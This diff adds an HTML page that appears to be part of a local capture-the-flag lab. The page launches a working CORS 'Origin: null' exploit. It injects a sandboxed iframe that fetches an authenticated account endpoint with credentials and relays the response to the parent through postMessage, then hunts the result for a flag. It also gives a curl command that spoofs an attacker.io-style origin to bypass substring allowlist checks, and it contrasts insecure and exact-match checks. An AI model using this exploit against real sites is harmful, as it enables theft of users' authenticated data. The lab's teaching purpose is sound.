@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>X2 — CORS Null Origin Exploit</title>
+  <style>
+    body { background: #0d1117; color: #e6edf3; font-family: 'Courier New', monospace; padding: 24px; margin: 0; }
+    h1 { color: #3fb950; font-size: 1.2rem; margin-bottom: 16px; }
+    h2 { color: #58a6ff; font-size: 1rem; margin: 16px 0 8px; }
+    .terminal { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 16px; margin: 12px 0; white-space: pre-wrap; font-size: 0.85rem; min-height: 60px; }
+    .status { color: #d29922; }
+    .success { color: #3fb950; }
+    .error { color: #f85149; }
+    button { background: #238636; color: #e6edf3; border: 1px solid #3fb950; border-radius: 4px; padding: 8px 16px; cursor: pointer; font-family: inherit; margin: 4px 2px; }
+    button:hover { background: #2ea043; }
+    input[type=text] { background: #161b22; color: #e6edf3; border: 1px solid #30363d; border-radius: 4px; padding: 8px; font-family: inherit; width: 100%; margin: 4px 0 8px; }
+    label { color: #7d8590; font-size: 0.85rem; }
+    a { color: #58a6ff; }
+    .badge { display: inline-block; font-size: 0.75rem; padding: 2px 8px; border-radius: 12px; margin-right: 6px; }
+    .attacker-badge { background: rgba(248,81,73,0.15); border: 1px solid #f85149; color: #f85149; }
+    .victim-badge { background: rgba(88,166,255,0.15); border: 1px solid #58a6ff; color: #58a6ff; }
+
+    .origin-bar {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 10px 14px;
+      margin-bottom: 20px;
+      font-size: 0.82rem;
+      display: flex;
+      gap: 24px;
+      flex-wrap: wrap;
+    }
+    .code-block {
+      background: #161b22;
+      border: 1px solid #388bfd44;
+      border-left: 3px solid #58a6ff;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 10px 0;
+      white-space: pre;
+      font-size: 0.82rem;
+      overflow-x: auto;
+    }
+    .flag-box {
+      background: rgba(63,185,80,0.08);
+      border: 1px solid #3fb950;
+      border-radius: 6px;
+      padding: 14px 16px;
+      margin: 12px 0;
+      font-size: 1rem;
+    }
+    .section-box {
+      background: #161b22;
+      border: 1px solid #30363d;
+      border-radius: 6px;
+      padding: 16px;
+      margin: 16px 0;
+    }
+    .section-box h2 { margin-top: 0; }
+    .warn-box {
+      background: rgba(210,153,34,0.08);
+      border: 1px solid #d29922;
+      border-radius: 6px;
+      padding: 12px 16px;
+      margin: 12px 0;
+      font-size: 0.83rem;
+      color: #d29922;
+    }
+    .nav { margin-bottom: 20px; font-size: 0.82rem; }
+    .divider { border: none; border-top: 1px solid #21262d; margin: 20px 0; }
+  </style>
+</head>
+<body>
+
+  <div class="nav"><a href="index.html">← Exploit Console</a></div>
+
+  <h1>[X2] CORS Null Origin Exploit</h1>
+
+  <div class="origin-bar">
+    <span><span class="badge attacker-badge">ATTACKER</span> http://localhost:3001 <em style="color:#6e7681">(this page)</em></span>
+    <span><span class="badge victim-badge">TARGET</span> http://localhost:3000 → /api/x2/account</span>
+  </div>
+
+  <p style="color:#7d8590; font-size:0.85rem; margin: 0 0 4px;">
+    The victim server trusts <code>Origin: null</code> in its CORS allowlist. Browsers send
+    <code>Origin: null</code> from sandboxed iframes (those with the <code>allow-same-origin</code> attribute absent).
+    This page exploits that by injecting a fetch into a sandboxed iframe so the browser sends <code>null</code>
+    as the origin — and the server happily allows it.
+  </p>
+
+  <!-- ==================== SECTION A ==================== -->
+  <div class="section-box">
+    <h2>Section A — Null Origin via Sandboxed iframe</h2>
+
+    <p style="color:#7d8590; font-size:0.83rem; margin: 0 0 12px;">
+      A sandboxed iframe without <code>allow-same-origin</code> in its <code>sandbox</code> attribute
+      causes the browser to send <code>Origin: null</code> for requests made inside it.
+      If the server trusts <code>null</code>, the response is exposed to the attacker parent page via
+      <code>postMessage</code>.
+    </p>
+
+    <button onclick="launchNullOriginExploit()">Launch Null-Origin Exploit</button>
+    <button onclick="clearSectionA()" style="background:#21262d; border-color:#30363d;">Clear</button>
+
+    <h2>Status</h2>
+    <div class="terminal" id="log-a"><span class="status">Waiting...</span></div>
+
+    <h2>Response from Victim (via iframe postMessage)</h2>
+    <div class="terminal" id="response-a"><span class="status">No response yet.</span></div>
+
+    <div id="flag-container-a" style="display:none;">
+      <div class="flag-box success" id="flag-display-a"></div>
+    </div>
+
+    <h2>Exploit Code — Section A</h2>
+    <div class="code-block">// Step 1: Create a sandboxed iframe.
+// "sandbox" without "allow-same-origin" strips the iframe of any origin,
+// so the browser sends Origin: null for all requests made inside it.
+
+const iframe = document.createElement('iframe');
+iframe.sandbox = 'allow-scripts';  // allow-same-origin intentionally omitted
+
+// Step 2: Inject a fetch into the iframe via srcdoc.
+// The fetch targets the victim's authenticated endpoint.
+iframe.srcdoc = `&lt;script&gt;
+fetch('http://localhost:3000/api/x2/account', { credentials: 'include' })
+  .then(r => r.json())
+  .then(data => parent.postMessage(JSON.stringify(data), '*'))
+  .catch(e  => parent.postMessage('Error: ' + e, '*'));
+&lt;/script&gt;`;
+
+document.body.appendChild(iframe);
+
+// Step 3: Listen for the result relayed back by postMessage.
+window.addEventListener('message', (e) => {
+  const data = JSON.parse(e.data);
+  // data.flag contains the flag because the server trusted Origin: null
+  console.log('Received from victim:', data);
+});</div>
+  </div>
+
+  <!-- ==================== SECTION B ==================== -->
+  <div class="section-box">
+    <h2>Section B — Regex / Substring Bypass (Theoretical)</h2>
+
+    <p style="color:#7d8590; font-size:0.83rem; margin: 0 0 8px;">
+      Some servers use a substring check like <code>origin.includes('localhost:3000')</code>
+      instead of an exact match. An attacker can register a domain that <em>contains</em>
+      the trusted string to bypass this check entirely.
+    </p>
+
+    <div class="warn-box">
+      <strong>Vulnerable server-side check:</strong><br>
+      <code style="color:#f0e68c;">if (origin.includes('localhost:3000')) { /* trust it */ }</code><br><br>
+      <strong>Bypass:</strong> Register a domain like <code>localhost:3000.attacker.io</code> and host your exploit there.
+      The substring check passes — the server trusts the attacker's domain.
+    </div>
+
+    <h2>How to Test This Manually (curl)</h2>
+    <div class="code-block"># Send a request with a spoofed Origin header that contains the trusted substring.
+# The server's regex/includes() check will pass, but the origin is attacker-controlled.
+
+curl -s -i \
+  -H "Origin: http://localhost:3000.attacker.io" \
+  -H "Cookie: session=&lt;your_session_cookie&gt;" \
+  http://localhost:3000/api/x2/account
+
+# Watch for:
+#   Access-Control-Allow-Origin: http://localhost:3000.attacker.io
+# If you see your spoofed origin reflected back, the regex is bypassable.</div>
+
+    <h2>Why Exact-Match Allowlists Matter</h2>
+    <div class="code-block">// INSECURE — substring check
+if (origin.includes('localhost:3000')) { /* bypassed by localhost:3000.evil.io */ }
+
+// INSECURE — loose regex
+if (/localhost:3000/.test(origin)) { /* same bypass */ }
+
+// SECURE — exact allowlist
+const ALLOWED = new Set(['http://localhost:3000', 'https://app.example.com']);
+if (ALLOWED.has(origin)) { /* only exact matches pass */ }</div>
+  </div>
+
+  <!-- Hidden iframe container -->
+  <div id="iframe-container" style="display:none;"></div>
+
+  <script>
+    // Listen for postMessage from the sandboxed iframe
+    window.addEventListener('message', function(e) {
+      const logEl     = document.getElementById('log-a');
+      const responseEl= document.getElementById('response-a');
+
+      const line = document.createElement('span');
+      line.className = 'success';
+      line.textContent = '[+] postMessage received from sandboxed iframe\n';
+      logEl.appendChild(line);
+
+      let parsed;
+      try {
+        parsed = JSON.parse(e.data);
+      } catch(_) {
+        responseEl.textContent = 'Raw message: ' + e.data;
+        return;
+      }
+
+      responseEl.textContent = JSON.stringify(parsed, null, 2);
+
+      // Hunt for flag
+      const raw = JSON.stringify(parsed);
+      const flagMatch = raw.match(/flag\{[^}]+\}/i);
+      if (parsed.flag || flagMatch) {
+        const flagValue = parsed.flag || (flagMatch && flagMatch[0]);
+        document.getElementById('flag-container-a').style.display = 'block';
+        document.getElementById('flag-display-a').textContent = 'FLAG CAPTURED: ' + flagValue;
+
+        const fl = document.createElement('span');
+        fl.className = 'success';
+        fl.textContent = '[!!!] FLAG CAPTURED: ' + flagValue + '\n';
+        logEl.appendChild(fl);
+      }
+    });
+
+    function launchNullOriginExploit() {
+      const logEl = document.getElementById('log-a');
+      logEl.innerHTML = '';
+      document.getElementById('response-a').innerHTML = '<span class="status">Waiting for iframe response...</span>';
+      document.getElementById('flag-container-a').style.display = 'none';
+
+      const append = (msg, cls) => {
+        const s = document.createElement('span');
+        s.className = cls || '';
+        s.textContent = msg + '\n';
+        logEl.appendChild(s);
+      };
+
+      append('[*] Creating sandboxed iframe (sandbox="allow-scripts", no allow-same-origin)...', 'status');
+
+      // Remove any previous iframe
+      const container = document.getElementById('iframe-container');
+      container.innerHTML = '';
+
+      // Build the iframe with srcdoc — the fetch inside will send Origin: null
+      const iframe = document.createElement('iframe');
+      iframe.sandbox = 'allow-scripts';  // allow-same-origin intentionally omitted
+
+      // srcdoc fetch — browser sends Origin: null because the iframe is sandboxed
+      iframe.srcdoc = `<script>
+fetch('http://localhost:3000/api/x2/account', { credentials: 'include' })
+  .then(r => r.json())
+  .then(data => parent.postMessage(JSON.stringify(data), '*'))
+  .catch(e  => parent.postMessage(JSON.stringify({error: String(e)}), '*'));
+<\/script>`;
+
+      container.appendChild(iframe);
+
+      append('[*] Sandboxed iframe injected into DOM.', 'status');
+      append('[*] Browser is sending: Origin: null (because iframe is sandboxed without allow-same-origin).', 'status');
+      append('[*] Waiting for postMessage reply from iframe...', 'status');
+    }
+
+    function clearSectionA() {
+      document.getElementById('log-a').innerHTML = '<span class="status">Waiting...</span>';
+      document.getElementById('response-a').innerHTML = '<span class="status">No response yet.</span>';
+      document.getElementById('flag-container-a').style.display = 'none';
+      document.getElementById('iframe-container').innerHTML = '';
+    }
+  </script>
+
+</body>
+</html>
